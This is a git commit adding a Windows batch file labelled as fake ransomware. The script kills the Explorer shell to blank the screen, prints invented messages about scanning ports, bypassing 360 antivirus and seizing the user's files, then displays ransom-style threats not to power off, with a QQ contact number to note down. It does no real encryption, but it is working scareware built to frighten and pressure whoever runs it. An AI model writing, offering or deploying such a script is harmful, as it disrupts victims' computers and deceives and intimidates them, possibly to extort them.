c680476c87c30c2c7a37822a37b67286fc4f6017
xione10 <770803169@qq.com>
2017-05-30 19:48:51 +0800

    Add files via upload

---
+++ Fake勒索/双击黑屏.bat
@@ -0,0 +1,75 @@
+taskkill /f /im explorer.exe
+CLS
+@color 2
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 读取系统内核信息成功...
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 正在进行端口扫描，查看开放未加密端口...
+@ping 127.0.0.1 -n 4 >nul
+@ECHO [-] 未找到，切换高级用户攻击模式...
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 启用高级虚拟服务
+@ping 127.0.0.1 -n 4 >nul 
+@ECHO [+] 正在扫描防火墙漏洞，...
+@ping 127.0.0.1 -n 5 >nul 
+@ECHO [+] (599/7896).
+@ping 127.0.0.1 -n 5 >nul 
+@ECHO [+] (4879/7896)..
+@ping 127.0.0.1 -n 5 >nul
+@ECHO [+] (7896/7896)...
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 读取成功发现漏洞，位置:C:\Program Files\Microsoft Analysis Services\AS OLEDB\10\Resources\1033
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [-] 360 屏蔽失败！！
+@ping 127.0.0.1 -n 4 >nul
+@ECHO [+] 重新部署攻击(1/3)
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [-] 失败
+@ping 127.0.0.1 -n 1 >nul
+@ECHO [+] 重新部署攻击(2/3)
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [-] 失败
+@ping 127.0.0.1 -n 1 >nul
+@ECHO [+] 重新部署攻击(3/3)
+@ping 127.0.0.1 -n 4 >nul
+@ECHO [+] 成功
+@ping 127.0.0.1 -n 5 >nul
+@ECHO [+] 切断用户net网络
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 获取用户文件控制权限成功
+@ping 127.0.0.1 -n 3 >nul
+@ECHO [+] 成功控制！
+@ping 127.0.0.1 -n 2 >nul
+@ECHO  I am only for the money, do not have power cut or restart,
+@ECHO  otherwise I can not guarantee your document is intact.
+@ping 127.0.0.1 -n 1 >nul
+@ECHO  我只为财，不要断电或重启，否则我可不保证你的文件完好无损
+@pause
+@ping 127.0.0.1 -n 4 >nul
+CLS
+@COLOR C
+@ECHO                +++++++++++++++++++++++++++++++++++++++++
+@ECHO                +         [+] 此电脑已被成功控制.       +
+@ECHO                +++++++++++++++++++++++++++++++++++++++++
+@ECHO                +    [+] 不要关机，否则数据丢失后果自负.+
+@ECHO                +++++++++++++++++++++++++++++++++++++++++
+@ECHO                +         [+] 你似乎打不开360           +
+@ECHO                +++++++++++++++++++++++++++++++++++++++++
+@ECHO                +          [+] 啧啧，乖,别哭            +
+@ECHO                +++++++++++++++++++++++++++++++++++++++++
+@ECHO                       YOU CAN TELL ME WHY YOU CRY!
+@ECHO             ________  ________  ________  ________  ________ 
+@ECHO		                AND  QQ:3124077687
+@ECHO             ________  ________  ________  ________  ________ 
+@ECHO		                   CALL ME XIONE
+@ECHO             ________  ________  ________  ________  ________ 
+@ECHO        	                    PUSH HOPE
+@ECHO		                    POP  DISPAIR
+@ECHO		                    OK...
+@ECHO		！！！不要按任意键在你记下我qq之前
+@ECHO		！！！不要按任意键在你记下我qq之前
+@ECHO		！！！不要按任意键在你记下我qq之前
+@ECHO		!!!DO NOT PRESS ANY KEY BEFORE U RECORD MY QQ
+@ECHO		!!!DO NOT PRESS ANY KEY BEFORE U RECORD MY QQ
+@ECHO		!!!DO NOT PRESS ANY KEY BEFORE U RECORD MY QQ
+@pause
